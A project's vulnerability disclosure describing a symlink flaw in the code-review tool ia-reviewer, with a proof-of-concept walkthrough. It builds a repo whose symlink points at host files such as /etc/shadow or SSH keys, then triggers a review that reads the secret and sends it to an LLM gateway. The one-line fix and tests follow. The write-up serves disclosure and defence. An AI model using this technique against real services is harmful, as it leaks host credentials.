# The symlink leak — anatomy of a real exploit our own tool found

> **Disclosure note.** This document explains a vulnerability that
> existed in ia-reviewer **between commits `71c58d5` and the fix
> landed in this PR**. It is published as part of the project's
> `observed-quality-cases` logbook because the bug was found by the
> tool reviewing itself — the strongest validation of the project's
> diploma thesis. The walkthrough below is **defensive use only**
> (same policy as the in-product exploit branch — see
> [`src/agents/exploit_proposal.py::EXPLOIT_DISCLAIMER`](../../src/agents/exploit_proposal.py)).
> Reproduce it only against a local instance you control. Do NOT
> attempt this against any production ia-reviewer deployment that
> isn't yours, including this project's hosted demo.

## TL;DR

A malicious GitHub repo with a symbolic link pointing at a host file
would have its contents exfiltrated to the configured LLM gateway
when an operator triggered a `repo`-mode review.

```
1. Attacker prepares a public repo with `ln -s /etc/shadow harmless.cfg`
2. Victim runs:  curl -X POST /review -d '{"repo_url": "<attacker-repo>"}'
3. ia-reviewer clones the repo (preserving the symlink)
4. list_repo_files enumerates harmless.cfg as a normal file
5. Reviewers read harmless.cfg → contents are /etc/shadow
6. Contents are sent to the LLM gateway as part of the security review prompt
7. Contents land in Langfuse traces and (potentially) the model provider's logs
```

**Fix**: one `if path.is_symlink(): continue` line in
[`src/integrations/repo_fetcher.py::list_repo_files`](../../src/integrations/repo_fetcher.py).
Two new TDD tests pin the behaviour
([`tests/unit/test_repo_fetcher.py`](../../tests/unit/test_repo_fetcher.py)).

## Why the vulnerability existed

Take a clean look at the pre-fix loop in `list_repo_files`:

```python
for path in snapshot_dir.rglob("*"):
    if not path.is_file():
        continue
    rel_parts = path.relative_to(snapshot_dir).parts
    if rel_parts and rel_parts[0] == ".git":
        continue
    try:
        size = path.stat().st_size
    except OSError:
        continue
    if size > MAX_FILE_BYTES:
        continue
    rel = "/".join(rel_parts)
    files.append(RepoFile(path=rel, content="", size=size))
```

Each filter looks reasonable in isolation:
- skip non-files
- skip `.git/` internals
- skip files larger than `MAX_FILE_BYTES = 200_000`

But there is a Python subtlety: **`Path.is_file()` follows symlinks
by default**. So a symlink `harmless.cfg -> /etc/shadow` returns
`is_file() = True`. So does `path.stat()`. The size cap fires
against the size of `/etc/shadow` (a few KB, easily under 200KB).

Result: the symlink is enumerated as if it were a perfectly normal
file in the repo. Downstream, `BaseReviewer._build_repo_file_context`
reads its contents via `(snapshot_root / rel_path).read_text()` —
which **also** follows symlinks — and hands the bytes to the LLM.

## Step-by-step attack walkthrough

> **Reminder: defensive use only.** The commands below assume you
> have a LOCAL ia-reviewer instance running on your own machine and
> a LOCAL throwaway file in place of `/etc/shadow` so you can prove
> the leak without exposing real system files. **Do not run these
> against a production instance you don't own.** Use placeholders
> for any real targets.

### Step 1 — attacker prepares a malicious repo

On the attacker's GitHub account:

```bash
# Throwaway victim file for local PoC (NOT a real secret).
echo "VICTIM_SECRET=replace-me-with-real-target-for-demo-only" \
    > /tmp/local-victim.env

# Compose a benign-looking repo with a symlink.
mkdir attack-repo && cd attack-repo
git init
echo 'def hello(): return "hi"' > app.py

# The exploit payload — a symlink that LOOKS like a config file.
# On a real attack this would point to /etc/shadow, ~/.ssh/id_rsa,
# or any host-side file accessible to the ia-reviewer process.
ln -s /tmp/local-victim.env service.conf

git add app.py service.conf
GIT_AUTHOR_NAME="attacker" GIT_AUTHOR_EMAIL="x@x" \
GIT_COMMITTER_NAME="attacker" GIT_COMMITTER_EMAIL="x@x" \
    git commit -m "initial commit"

# Push to your own throwaway GitHub repo. Make it public so
# ia-reviewer's clone allowlist accepts it without a token.
git remote add origin https://github.com/<attacker>/attack-repo.git
git push -u origin main
```

The repo looks completely innocent in the GitHub UI — just two
files, `app.py` (a tiny Python module) and `service.conf` (rendered
in the GitHub web UI as the symlink target string, which most
reviewers wouldn't notice).

### Step 2 — victim operator triggers a review

Whoever runs the ia-reviewer instance:

```bash
curl -X POST http://localhost:8000/review \
  -H 'Content-Type: application/json' \
  -d '{"repo_url": "https://github.com/<attacker>/attack-repo", "ref": "main"}'
# {"status":"started","thread_id":"...","repo_url":"...","ref":"main"}
```

### Step 3 — what happens server-side (pre-fix)

```
clone_repo               → git clone --depth=1 → snapshots/ia-review-XYZ/
                           service.conf is preserved AS A SYMLINK by git
                           (git's default is to keep symlinks portable)

list_repo_files          → rglob('*') visits service.conf
                           service.conf.is_file()  → True   (follows link!)
                           service.conf.stat()     → succeeds (follows link!)
                           size                    → ~50 bytes  (under cap)
                           recorded as RepoFile(path="service.conf", size=50)

InjectionReviewer        → fnmatch on PATH_PATTERNS — *.conf is NOT in the
                           injection whitelist, so this file is filtered out.
                           So far so good.

OWASPTop10Reviewer       → fnmatch on PATH_PATTERNS — *.conf MATCHES the
                           OWASP whitelist (config files).
                           Calls (snapshot_root / "service.conf").read_text()
                           → reads /tmp/local-victim.env  ← LEAK
                           Sends file_contents to the LLM gateway.
```

### Step 4 — where the leaked content surfaces

The leaked bytes land in **three** places:

1. **The LLM gateway's request log.** Whoever operates the gateway
   sees the prompt, including `file_contents:\nVICTIM_SECRET=...`.
2. **Langfuse traces.** Every reviewer call is observed via the
   LangChain callback handler; the prompt body is captured verbatim.
   Anyone with read access to Langfuse sees the secret.
3. **The published security review report.** If the LLM happens to
   echo the file contents back (it often does, to "show evidence"),
   the secret lands in `reports/<thread_id>.md`, which is served
   over HTTP on the `/reports/{filename}` endpoint with no auth.

### Step 5 — verify it WAS broken (pre-fix reproducer)

To prove the bug existed, run the pre-fix code against the unit
test we added. Without the `is_symlink()` guard you can show the
symlink being enumerated. Inside a Python REPL:

```python
import tempfile, os
from pathlib import Path

# Simulate the bug WITHOUT the fix
with tempfile.TemporaryDirectory() as td:
    snap = Path(td)
    (snap / "app.py").write_text("hi")

    secret_target = Path(td).parent / "shadow"
    secret_target.write_text("root:$6$xxx$:0:0:99999:7:::")

    (snap / "service.conf").symlink_to(secret_target)

    # Pre-fix logic — no is_symlink() check
    for p in snap.rglob("*"):
        if not p.is_file():
            continue
        print(p.relative_to(snap), "size=", p.stat().st_size)
        # service.conf SHOWS UP HERE with size = 27 (the secret length).
        # Reading p.read_text() would yield the secret.
```

### Step 6 — verify it's NOW fixed

```bash
.venv/bin/pytest tests/unit/test_repo_fetcher.py::test_list_repo_files_skips_symlinks_to_outside_files -v
# ... PASSED ...
```

Or end-to-end against the running container, with the same crafted
repo from Step 1:

```bash
curl -X POST http://localhost:8000/review \
  -H 'Content-Type: application/json' \
  -d '{"repo_url": "https://github.com/<attacker>/attack-repo", "ref": "main"}'
# Wait for completion, then:
grep -E "VICTIM_SECRET|root:\$6" reports/<thread_id>.md
# (no output — the symlink was never read)
```

## The fix in detail

```diff
 for path in snapshot_dir.rglob("*"):
+    if path.is_symlink():
+        continue
     if not path.is_file():
         continue
```

One line. `Path.is_symlink()` does NOT follow the link (unlike
`is_file()` / `is_dir()` / `stat()`). The check has to be placed
BEFORE `is_file()` because by the time `is_file()` runs we've
already lost the chance to distinguish "real file in the repo" from
"symlink pointing at a host file".

We deliberately do not try to validate "but is the symlink target
inside the snapshot? then it's safe?". That cleverness:
- adds resolve() / is_relative_to() complexity
- has its own footguns (cross-filesystem, relative paths, `../`
  sequences)
- doesn't actually buy anything — we don't NEED symlinks in the
  enumeration anyway, since git-cloned repos with internal symlinks
  are vanishingly rare in normal code

A blanket "no symlinks" rule is correct and cheap.

## Why our own tool found it (the diploma point)

This bug existed since commit `71c58d5` — over a month. It survived:
- code review during the initial repo-mode PR
- a security-checklist audit (`docs/security-checklist.md::PR2.1`
  did add a symlink guard, but for the `/reports/{filename}` HTTP
  endpoint, not for `list_repo_files`)
- multiple manual passes over the codebase

The bug was found by **ia-reviewer running on itself with
Qwen3.6-27B as the reviewer model**. From the OWASP reviewer's
report on `src/integrations/repo_fetcher.py:230`:

> Symlink following in `list_repo_files` allows arbitrary host file
> reads. `path.is_file()` and `path.stat()` follow symlinks by
> default. A cloned repository containing symlinks pointing to
> sensitive host paths (e.g., /etc/shadow, .env, or SSH keys) will
> be treated as valid files, recorded, and subsequently read by
> downstream reviewers, leaking host secrets.

The reviewer correctly identified:
- the exact file and line
- the exact Python API gotcha (`is_file()` follows symlinks)
- the attack vector (cloned repo with symlinks)
- example targets (`/etc/shadow`, `.env`, SSH keys)
- the impact (host secrets leaked)

This is exactly the kind of finding the project exists to surface.
A 27B-parameter open-weight model running on a single GPU produced
production-actionable security analysis, and one of those findings
turned out to be a real exploit we missed in manual review.

That's the dissertation defence in one sentence: **the architecture
works**.

## Related follow-ups

This was finding #1 from the Qwen3.6-27B self-review
([`qwen3.6-27b-2026-06-06.md`](./qwen3.6-27b-2026-06-06.md)).
The other ~5 real findings from that run are tracked in the
follow-ups section of that file. Likely-next:

- `_write_repo_report` path-traversal guard (defense-in-depth)
- Validator prompt-injection delimitation
- `_host_is_allowed` DNS-rebinding mitigation
- `_discover_gateway_model_id` allowlist

## Security-checklist update

Adding a row to `docs/security-checklist.md::Threat model — in scope`:

| Vector | Status | Coverage |
|---|---|---|
| Symlink-based host-file exfiltration via cloned repo | **Mitigated** | `list_repo_files` skips symlinks (this PR); `/reports/{filename}` endpoint already guarded by PR2.1 |
